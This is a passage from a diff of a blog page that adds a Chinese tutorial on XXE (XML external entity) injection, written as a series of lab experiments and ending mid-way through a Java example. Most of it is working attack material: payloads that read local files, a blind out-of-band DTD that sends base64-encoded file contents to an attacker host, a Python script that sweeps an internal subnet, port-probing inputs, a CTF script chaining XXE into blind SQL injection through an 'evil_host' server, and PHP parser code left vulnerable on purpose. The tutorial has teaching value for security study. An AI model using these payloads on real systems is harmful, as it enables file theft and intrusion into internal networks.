@@ -10,7 +10,10 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="H3ng,"> 
-    
+    <meta name="description" content="一、XXE 是什么介绍 XXE 之前，我先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞
+如图所示：
+
+既然能插入 XML 代码，那我们肯定不能善罢甘休，我们需要更多,"> 
     <meta name="author" content="H3ng"> 
     <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -52,7 +55,720 @@
 
         </div>
         <div class="content markdown">
-            
+            <h2 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h2><p>介绍 XXE 之前，我先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png" alt="img"></a></p>
+<p>既然能插入 XML 代码，那我们肯定不能善罢甘休，我们需要更多，于是出现了 XXE</p>
+<p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 <strong>外部实体</strong> ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(<strong>盯好外部实体就行了</strong>)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）</p>
+<h2 id="二、简单介绍一下背景知识："><a href="#二、简单介绍一下背景知识：" class="headerlink" title="二、简单介绍一下背景知识："></a><strong>二、简单介绍一下背景知识：</strong></h2><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p>
+<p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。  外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。  但是，在处理外部实体时，可以针对应用程序启动许多攻击。  这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。  通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p>
+<h2 id="三、基础知识"><a href="#三、基础知识" class="headerlink" title="三、基础知识"></a><strong>三、基础知识</strong></h2><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;?xml version="1.0"?&gt;//这一行是 XML 文档定义
+&lt;!DOCTYPE message [
+&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;
+&lt;!ELEMENT receiver (#PCDATA)&gt;
+&lt;!ELEMENT sender (#PCDATA)&gt;
+&lt;!ELEMENT header (#PCDATA)&gt;
+&lt;!ELEMENT msg (#PCDATA)&gt;</code></pre>
+<p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;message&gt;
+&lt;receiver&gt;Myself&lt;/receiver&gt;
+&lt;sender&gt;Someone&lt;/sender&gt;
+&lt;header&gt;TheReminder&lt;/header&gt;
+&lt;msg&gt;This is an amazing book&lt;/msg&gt;
+&lt;/message&gt;</code></pre>
+<p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe "test" &gt;]&gt;</code></pre>
+<p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre>
+<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
+<h3 id="重点来了："><a href="#重点来了：" class="headerlink" title="重点来了："></a><strong>重点来了：</strong></h3><p><strong>重点一：</strong></p>
+<p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" &gt;]&gt;
+&lt;creds&gt;
+    &lt;user&gt;&amp;xxe;&lt;/user&gt;
+    &lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre>
+<p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p>
+<p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p>
+<pre><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre>
+<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
+<p><strong>重点二：</strong></p>
+<p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p>
+<p><strong>1.通用实体</strong></p>
+<p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; 
+&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"&gt; ]&gt; 
+&lt;updateProfile&gt;  
+    &lt;firstname&gt;Joe&lt;/firstname&gt;  
+    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  
+    ... 
+&lt;/updateProfile&gt;</code></pre>
+<p><strong>2.参数实体：</strong></p>
+<p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br> (2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br> (3)和通用实体一样，参数实体也可以外部引用</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;!ENTITY % an-element "&lt;!ELEMENT mytag (subtag)&gt;"&gt; 
+&lt;!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"&gt; 
+%an-element; %remote-dtd;</code></pre>
+<p><strong>抛转：</strong></p>
+<p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p>
+<h2 id="四、我们能做什么"><a href="#四、我们能做什么" class="headerlink" title="四、我们能做什么"></a><strong>四、我们能做什么</strong></h2><p>上一节疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p>
+<p>实际上，当你看到下面这段代码的时候，有一点安全意识的小伙伴应该隐隐约约能觉察出什么</p>
+<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre>
+<p>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p>
+<h3 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a><strong>实验一：有回显读本地敏感文件(Normal XXE)</strong></h3><p>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p>
+<p>本地服务器上放上解析 XML 的 php 代码：</p>
+<p><strong>示例代码：</strong></p>
+<p><strong>xml.php</strong></p>
+<pre><code>&lt;?php
+
+    libxml_disable_entity_loader (false);
+    $xmlfile = file_get_contents('php://input');
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+    $creds = simplexml_import_dom($dom);
+    echo $creds;
+
+?&gt;</code></pre>
+<p><strong>payload:</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; 
+&lt;!DOCTYPE creds [  
+&lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt; 
+&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre>
+<p><strong>结果如下图：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7e63e5a-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7e63e5a-ec17-1.png" alt="img"></a></p>
+<p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，<strong>那么我么要是换成下面这个文件呢？</strong></p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e8138df6-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e8138df6-ec17-1.png" alt="img"></a></p>
+<p>我们试一下：</p>
+<p><strong>结果如下图：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e844e770-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e844e770-ec17-1.png" alt="img"></a></p>
+<p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下(引用自我的一片介绍 XML 的博客)：</p>
+<blockquote>
+<p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者<br> “ 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p>
+<pre><code>&lt;![CDATA[</code></pre>
+<pre><code>XXXXXXXXXXXXXXXXX
+
+]]&gt;</code></pre>
+<p>可以输入任意字符除了 ]]&gt; 不能嵌套</p>
+<p>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</p>
+</blockquote>
+<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p>
+<p>首先，找到问题出现的地方，问题出现在</p>
+<pre><code>...
+&lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt;
+&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre>
+<p>引用并不接受可能会引起 xml  格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 “<!--[CDATA["和 “]]-->”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p>
+<p><strong>结果如下图：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e885c2b8-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e885c2b8-ec17-1.png" alt="img"></a></p>
+<p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用，那么要想在 DTD<br> 中拼接，我们知道我们只有一种选择，就是使用 参数实体</p>
+<p><strong>payload:</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start "&lt;![CDATA["&gt;   
+&lt;!ENTITY % goodies SYSTEM "file:///d:/test.txt"&gt;  
+&lt;!ENTITY % end "]]&gt;"&gt;  
+&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt; 
+%dtd; ]&gt; 
+
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre>
+<p><strong>evil.dtd</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt; 
+&lt;!ENTITY all "%start;%goodies;%end;"&gt;</code></pre>
+<p><strong>结果如下图：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e8b7bd54-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e8b7bd54-ec17-1.png" alt="img"></a></p>
+<p>感兴趣的童鞋可以分析一下整个调用过程，因为我在下面的例子中有分析一个类似的例子，于是出于篇幅考虑我这里就不分析了。</p>
+<blockquote>
+<p><strong>注意：</strong></p>
+<p>这里提一个点，如果是在 java 中 还有一个协议能代替 file 协议 ，那就是 netdoc ，使用方法我会在后面的分析 微信的 XXE<br> 的时候顺带演示</p>
+</blockquote>
+<h3 id="新的问题出现"><a href="#新的问题出现" class="headerlink" title="新的问题出现"></a><strong>新的问题出现</strong></h3><p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p>
+<h3 id="新的解决方法"><a href="#新的解决方法" class="headerlink" title="新的解决方法"></a><strong>新的解决方法</strong></h3><p>想要外带就必须能发起请求，那么什么地方能发起请求呢？  很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p>
+<h3 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a><strong>实验二：无回显读取本地敏感文件(Blind OOB XXE)</strong></h3><p><strong>xml.php</strong></p>
+<pre><code>&lt;?php
+
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents('php://input');
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+?&gt;</code></pre>
+<p><strong>test.dtd</strong></p>
+<pre><code>&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt"&gt;
+&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://ip:9999?p=%file;'&gt;"&gt;</code></pre>
+<p><strong>2019.5.8 更新</strong></p>
+<p>我发现上面这段代码由于解析的问题将 send 前面的 HTML 实体转化成了 % ,虽然我在下面做出了一些解释，但是因为存在复制粘贴代码的行为，因此我决定还是在这里用图片的形式再次展示一下我的代码</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20190508205142-077ed10c-7190-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190508205142-077ed10c-7190-1.png" alt="img"></a></p>
+<p><strong>payload：</strong></p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM "http://ip/test.dtd"&gt;
+%remote;%int;%send;
+]&gt;</code></pre>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e8e966b0-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e8e966b0-ec17-1.png" alt="img"></a></p>
+<p><strong>结果如下：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png" alt="img"></a></p>
+<p>我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。</p>
+<p><strong>整个调用过程：</strong></p>
+<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote  先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的  %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %,  所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<h3 id="新的思考："><a href="#新的思考：" class="headerlink" title="新的思考："></a><strong>新的思考：</strong></h3><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF  的童鞋应该很快反应过来，这其实非常类似于 SSRF  ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如  192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF  其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
+<h3 id="新的利用："><a href="#新的利用：" class="headerlink" title="新的利用："></a><strong>新的利用：</strong></h3><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p>
+<p><strong>如图所示:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt="img"></a></p>
+<p>PHP在安装扩展以后还能支持的协议：</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png" alt="img"></a></p>
+<blockquote>
+<p><strong>注意：</strong></p>
+<p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br> update 7 和 Oracle JDK 1.6 update 35<br> 2.libxml 是 PHP 的 xml 支持</p>
+</blockquote>
+<h3 id="实验三：HTTP-内网主机探测"><a href="#实验三：HTTP-内网主机探测" class="headerlink" title="实验三：HTTP 内网主机探测"></a><strong>实验三：HTTP 内网主机探测</strong></h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file  协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取  /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>
+<p><strong>下面是一个探测脚本的实例：</strong></p>
+<pre><code>import requests
+import base64
+
+#Origtional XML that the server accepts
+#&lt;xml&gt;
+#    &lt;stuff&gt;user&lt;/stuff&gt;
+#&lt;/xml&gt;
+
+
+def build_xml(string):
+    xml = """&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;"""
+    xml = xml + "\r\n" + """&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;"""
+    xml = xml + "\r\n" + """&lt;!ENTITY xxe SYSTEM """ + '"' + string + '"' + """&gt;]&gt;"""
+    xml = xml + "\r\n" + """&lt;xml&gt;"""
+    xml = xml + "\r\n" + """    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;"""
+    xml = xml + "\r\n" + """&lt;/xml&gt;"""
+    send_xml(xml)
+
+def send_xml(xml):
+    headers = {'Content-Type': 'application/xml'}
+    x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
+    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
+    print coded_string
+#   print base64.b64decode(coded_string)
+for i in range(1, 255):
+    try:
+        i = str(i)
+        ip = '10.0.0.' + i
+        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
+        print string
+        build_xml(string)
+    except:
+continue</code></pre>
+<p><strong>返回结果：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png" alt="img"></a></p>
+<h3 id="实验四：HTTP-内网主机端口扫描"><a href="#实验四：HTTP-内网主机端口扫描" class="headerlink" title="实验四：HTTP 内网主机端口扫描"></a><strong>实验四：HTTP 内网主机端口扫描</strong></h3><p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip  地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</p>
+<p><strong>比如我们传入：</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;  
+&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
+&lt;!ELEMENT data (#PCDATA)&gt;  
+]&gt;
+&lt;data&gt;4&lt;/data&gt;</code></pre>
+<p><strong>返回结果：</strong></p>
+<pre><code>javax.xml.bind.UnmarshalException  
+ - with linked exception:
+[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
+Exception Description: An error occurred unmarshalling the document  
+Internal Exception: ████████████████████████: Connection refused</code></pre>
+<p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</p>
+<p><strong>如下图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png" alt="img"></a></p>
+<p>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get  请求就能直接getshell 的 比如 strus2）</p>
+<h3 id="实验五：内网盲注-CTF"><a href="#实验五：内网盲注-CTF" class="headerlink" title="实验五：内网盲注(CTF)"></a><strong>实验五：内网盲注(CTF)</strong></h3><p>2018 强网杯 有一道题就是利用  XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</p>
+<p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea345868-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea345868-ec17-1.png" alt="img"></a></p>
+<p>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p>
+<pre><code>/var/www/52dandan.cc/public_html/config.php</code></pre>
+<p>拿到第一部分 flag</p>
+<pre><code>&lt;?php
+define(BASEDIR, "/var/www/52dandan.club/");
+define(FLAG_SIG, 1);
+define(SECRETFILE,'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431');
+....
+?&gt;</code></pre>
+<blockquote>
+<p><strong>注意：</strong></p>
+<p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br> 过滤器的一个压缩的方法</p>
+<pre><code>压缩：echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");
+解压：echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1");</code></pre>
+</blockquote>
+<p>然后我们考虑内网有没有东西，我们读取</p>
+<pre><code>/proc/net/arp
+/etc/host</code></pre>
+<p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p>
+<p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个  test.php  ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE  ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的  DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>import requests
+url = 'http://39.107.33.75:33899/common.php'
+s = requests.Session()
+result = ''
+data = {
+        "name":"evil_man",
+        "email":"testabcdefg@gmail.com",
+        "comment":"""&lt;?xml version="1.0" encoding="utf-8"?&gt;
+                &lt;!DOCTYPE root [
+                &lt;!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd"&gt;
+                %dtd;]&gt;
+                """
+}
+
+for i in range(0,28):
+        for j in range(48,123):
+                f = open('./evil.dtd','w')
+            payload2 = """&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1"&gt;
+                &lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'&gt;"&gt;
+                %all;
+                %send;""".format('_'*i+chr(j)+'_'*(27-i))
+                f.write(payload2)
+                f.close()
+                print 'test {}'.format(chr(j))
+                r = s.post(url,data=data)
+                if "Oti3a3LeLPdkPkqKF84xs=" in r.content and chr(j)!='_':
+                        result += chr(j)
+                        print chr(j)
+                        break
+print result</code></pre>
+<p>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</p>
+<h3 id="实验六：文件上传"><a href="#实验六：文件上传" class="headerlink" title="实验六：文件上传"></a><strong>实验六：文件上传</strong></h3><p>我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java  中有一个比较神奇的协议 jar:// ， php  中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</p>
+<p><strong>jar:// 协议的格式：</strong></p>
+<pre><code>jar:{url}!{path}</code></pre>
+<p><strong>实例：</strong></p>
+<pre><code>jar:http://host/application.jar!/file/within/the/zip
+
+这个 ! 后面就是其需要从中解压出的文件</code></pre>
+<p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar://  是没法远程加载文件的（因此 phar://  一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的   phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</p>
+<p><strong>jar 协议处理文件的过程：</strong></p>
+<p>(1) 下载 jar/zip 文件到临时文件中<br> (2) 提取出我们指定的文件<br> (3) 删除临时文件</p>
+<blockquote>
+<p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p>
+<p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p>
+</blockquote>
+<p>下面是我的一些测试过程：</p>
+<p>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</p>
+<p><strong>示例代码：</strong></p>
+<p><strong>xml_test.java</strong></p>
+<pre><code>package xml_test;
+import java.io.File;
+
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+
+import org.w3c.dom.Attr;
+import org.w3c.dom.Comment;
+import org.w3c.dom.Document;
+import org.w3c.dom.Element;
+import org.w3c.dom.NamedNodeMap;
+import org.w3c.dom.Node;
+import org.w3c.dom.NodeList;
+
+/**
+ * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上
+ * @author zhanglong
+ *
+ */
